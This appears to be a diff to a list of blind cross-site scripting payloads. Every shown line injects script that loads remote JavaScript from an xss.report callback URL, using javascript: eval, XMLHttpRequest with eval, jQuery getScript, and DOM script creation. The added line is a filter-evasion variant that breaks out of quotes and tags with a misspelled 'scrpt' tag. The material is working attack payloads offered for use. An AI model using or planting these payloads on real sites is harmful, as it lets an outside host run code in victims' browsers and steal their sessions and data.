@@ -15,3 +15,4 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/hnterx");a.send();</script>
 <script>$.getScript("//xss.report/c/hnterx")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/hnterx";document.body.appendChild(a);
+';"</scrpt><scrpt/src=//xss.report/c/hnterx></scrpt>
